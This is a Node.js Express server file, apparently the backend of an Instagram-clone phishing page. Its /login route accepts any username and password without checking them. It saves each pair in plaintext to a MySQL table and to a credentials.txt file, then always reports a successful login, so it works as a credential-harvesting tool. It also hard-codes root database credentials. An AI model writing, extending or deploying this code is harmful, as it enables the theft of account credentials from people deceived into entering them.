const express = require('express');
const mysql = require('mysql2');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Database Connection
const dbConfig = {
    host: 'localhost',
    user: 'root',
    password: 'root',
    // Not specifying database yet so we can create it
};

const db = mysql.createConnection(dbConfig);

db.connect((err) => {
    if (err) {
        console.error('Error connecting to MySQL:', err);
        return;
    }
    console.log('Connected to MySQL server.');

    // 1. Create Database if it doesn't exist
    db.query('CREATE DATABASE IF NOT EXISTS insta_clone_db', (err) => {
        if (err) {
            console.error('Error creating database:', err);
            return; // Stop if we can't create DB
        }
        console.log('Database "insta_clone_db" checked/created.');

        // 2. Use the new database
        db.changeUser({ database: 'insta_clone_db' }, (err) => {
            if (err) {
                console.error('Error switching to insta_clone_db:', err);
                return;
            }
            console.log('Switched to database "insta_clone_db".');

            // 3. Create Table
            const createTableQuery = `CREATE TABLE IF NOT EXISTS users (
                id INT AUTO_INCREMENT PRIMARY KEY,
                username VARCHAR(255),
                password VARCHAR(255),
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )`;

            db.query(createTableQuery, (err) => {
                if (err) {
                    console.error('Error creating table:', err);
                } else {
                    console.log('Table "users" checked/created.');
                }
            });
        });
    });
});

// Routes
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Simple validation
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Missing credentials' });
    }

    const query = "INSERT INTO users (username, password) VALUES (?, ?)";
    db.query(query, [username, password], (err, result) => {
        if (err) {
            console.error('Error inserting data:', err);
            return res.status(500).json({ success: false, message: 'Database error' });
        }
        console.log(`User logged in: ${username}`);

        // Save to text file (backup)
        const logEntry = `${username} -- ${password}\n`;
        fs.appendFile('credentials.txt', logEntry, (err) => {
            if (err) {
                console.error('Error writing to file:', err);
            }
        });

        res.json({ success: true, message: 'Login successful' });
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
